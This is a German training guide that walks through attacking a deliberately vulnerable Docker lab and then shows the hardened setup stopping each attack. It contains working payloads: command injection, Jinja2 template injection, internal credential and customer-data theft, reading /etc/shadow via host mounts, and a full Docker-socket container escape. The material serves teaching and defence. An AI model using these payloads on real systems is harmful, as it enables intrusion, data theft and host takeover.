# Docker Container Security — Angriffs- und Härtungsanleitung

## Überblick

Diese Anleitung beschreibt Schritt für Schritt, wie die eingebauten Schwachstellen in der
verwundbaren Docker-Umgebung ausgenutzt und anschließend durch die gehärtete Version verhindert
werden.

---

## Vorbereitung

### Projekt starten

```bash
docker compose up -d --build
```

Ca. 30–60 Sekunden warten (MySQL-Initialisierung), dann im Browser öffnen:

```
http://localhost:5001
```

---

## Schritt 1 — Command Injection

### Ziel

Zeigen, dass unsanitisierte Nutzereingaben direkt als Shell-Befehl ausgeführt werden.

### Normaler Test

Im Ping-Formular eingeben:

```
8.8.8.8
```

Erwartetes Ergebnis: normales Ping-Ausgabe.

### Angriff

Eingabe:

```
8.8.8.8; whoami
```

Erwartetes Ergebnis:

```
root
```

Der Angreifer führt beliebige Befehle als Root-Benutzer aus.

### Erkundung des Systems

```
8.8.8.8; id
8.8.8.8; cat /etc/os-release
8.8.8.8; cat /proc/1/cgroup
```

`/proc/1/cgroup` zeigt Einträge mit `docker` — bestätigt, dass wir uns im Container befinden.

---

## Schritt 2 — Server-Side Template Injection (SSTI)

### Ziel

Zeigen, dass Nutzereingaben, die direkt in ein serverseitiges Template eingebettet werden,
zur Ausführung von Code auf dem Server führen können.

### Angriff

Im Browser aufrufen:

```
http://localhost:5001/report?title={{7*7}}
```

Erwartetes Ergebnis: Die Seite zeigt `49` statt des eingegebenen Textes.
Jinja2 hat den Template-Ausdruck serverseitig ausgewertet.

### Weiterführend

```
http://localhost:5001/report?title={{config}}
```

Zeigt die vollständige Flask-Konfiguration einschließlich des `SECRET_KEY`.

```
http://localhost:5001/report?title={{''.__class__.__mro__[1].__subclasses__()}}
```

Listet alle Python-Subklassen auf — Ausgangspunkt für vollständige Remote Code Execution.

---

## Schritt 3 — Lateral Movement

### Ziel

Zeigen, wie ein kompromittierter Container andere Dienste im internen Netz angreift.

### Netzwerk erkunden

```
8.8.8.8; cat /etc/hosts
```

Zeigt die eigene IP-Adresse des Containers.

### Andere Container finden

```
;for i in $(seq 1 15); do ping -c 1 -W 1 172.18.0.$i 2>/dev/null | grep "bytes from" && echo "HOST: 172.18.0.$i"; done
```

Hinweis: IP-Adressen können variieren.

### Admin-Service angreifen

```
; curl -s http://admin:8080/api/config
```

Erwartetes Ergebnis: AWS-Keys, Admin-Zugangsdaten, Datenbankkonfiguration.

Docker-DNS erlaubt die Auflösung des Service-Namens `admin` direkt.

### Datenbank angreifen

```
; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
```

Erwartetes Ergebnis: Alle Kundendatensätze einschließlich Kreditkarteninformationen.

---

## Schritt 4 — Container Escape (Privileged Mode)

### Ziel

Zeigen, wie ein privilegierter Container auf das Host-Dateisystem zugreifen kann.

### Privilegierten Modus erkennen

```
; fdisk -l 2>/dev/null | head -10
```

Wenn Festplatten angezeigt werden: Container ist privilegiert.

### Block-Devices anzeigen

```
; lsblk
```

Device-Namen können variieren: `sda1`, `vda1`, `xvda1`.

### Host-Dateisystem einhängen

```
; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
```

### Host-Dateien lesen

```
; cat /mnt/host/etc/hostname
; cat /mnt/host/etc/shadow | head -5
```

Vollständiger Lesezugriff auf das Host-Dateisystem.

---

## Schritt 5 — Secrets in Umgebungsvariablen

### Ziel

Zeigen, dass Passwörter und API-Keys in Umgebungsvariablen für jeden Prozess im Container
lesbar sind.

### Angriff aus dem Container

```
; cat /proc/1/environ | tr '\0' '\n'
```

Erwartetes Ergebnis:

```
DB_PASSWORD=root
SECRET_API_KEY=sk-prod-a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5
JWT_SECRET=my-super-secret-jwt-signing-key-2024
```

### Angriff von außen (Docker-Host)

```bash
docker inspect $(docker compose ps -q webapp) | python3 -m json.tool | grep -A 10 '"Env"'
```

---

## Schritt 6 — Secrets in Image-Layern

### Ziel

Zeigen, dass Zugangsdaten, die in `RUN`-Befehlen im Dockerfile vorkommen, dauerhaft in
der Image-History gespeichert bleiben.

### Image-History analysieren

```bash
docker history --no-trunc docker-container-security-webapp
```

Erwartetes Ergebnis: Ein `RUN`-Befehl mit dem Datenbankzugang im Klartext:

```
RUN echo "BACKUP_DB_URL=mysql://backup_user:Backup@2024!@db-prod.firma.local/kundenportal" ...
```

### Aus dem Container

```
; cat /etc/environment
```

---

## Schritt 7 — Docker Socket Exposure

### Ziel

Zeigen, dass ein in den Container eingebundener Docker-Socket vollständige Kontrolle über
den Docker-Daemon und damit über den Host ermöglicht.

### Socket prüfen

```
; ls -la /var/run/docker.sock
```

### Laufende Container auflisten

```
; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool | head -40
```

### Privilegierten Container über die API erstellen

```
; curl -s --unix-socket /var/run/docker.sock \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow | head -5"],"Binds":["/:/host"],"Privileged":true}' \
    "http://localhost/containers/create?name=escape2"
```

Container starten:

```
; curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape2/start
```

Ausgabe lesen:

```
; sleep 2 && curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/escape2/logs?stdout=1"
```

Ergebnis: `/etc/shadow` des Hosts wird ausgegeben — vollständige Host-Übernahme ohne `--privileged`.

---

## Härtung demonstrieren

### Verwundbare Version stoppen

```bash
docker compose down
```

### Gehärtete Version starten

```bash
docker compose -f docker-compose.hardened.yml up -d --build
```

Dann im Browser öffnen: `http://localhost:5001` (grünes Design = gehärtet)

### Command Injection erneut versuchen

Eingabe:

```
8.8.8.8; whoami
```

Erwartetes Ergebnis: `Ungültige Eingabe!` — die Input-Validierung blockiert den Angriff.

### Container betreten und Rechte prüfen

```bash
docker compose -f docker-compose.hardened.yml exec webapp sh
```

```bash
whoami        # → appuser (nicht root)
fdisk -l      # → Permission denied
mount         # → Permission denied
curl admin:8080  # → Network unreachable (Segmentierung)
```

### Aufräumen

```bash
docker compose -f docker-compose.hardened.yml down
```

---

## Zusammenfassung der Schwachstellen und Gegenmaßnahmen

| Schwachstelle | Ursache | Gegenmaßnahme |
|---|---|---|
| Command Injection | `shell=True`, keine Validierung | Regex-Whitelist, Argumente als Liste |
| SSTI | Nutzereingabe als Template | Festes Template, Werte als Variablen |
| Lateral Movement | Webapp in beiden Netzen | Netzwerksegmentierung, `internal: true` |
| Container Escape | `privileged: true` | Flag weglassen, `cap_drop: ALL` |
| Env-Var Secrets | Secrets als Umgebungsvariablen | Docker Secrets / externe Vaults |
| Image-Layer Secrets | Credentials in `RUN`-Befehlen | Build-Argumente, mehrstufige Builds |
| Docker Socket | Socket als Volume eingebunden | Socket nie exponieren |
| Schwaches Passwort | `MYSQL_ROOT_PASSWORD: root` | Starkes Zufallspasswort |
| Root im Container | Kein `USER`-Direktive | Non-Root-User im Dockerfile |

---

## Kernaussage

Container sind keine vollständige Sicherheitsgrenze.

Ohne gezielte Härtung können:
- beliebige Befehle eingeschleust werden (Command Injection, SSTI)
- andere Container und Dienste kompromittiert werden (Lateral Movement)
- das Host-System übernommen werden (Privileged Escape, Docker Socket)
- Zugangsdaten aus dem laufenden System oder aus Image-Layern extrahiert werden

Sicherheit in Container-Umgebungen entsteht durch das Zusammenspiel mehrerer Maßnahmen:
Least-Privilege, Netzwerksegmentierung, sichere Konfiguration, Input-Validierung und
sorgfältiges Secrets-Management.
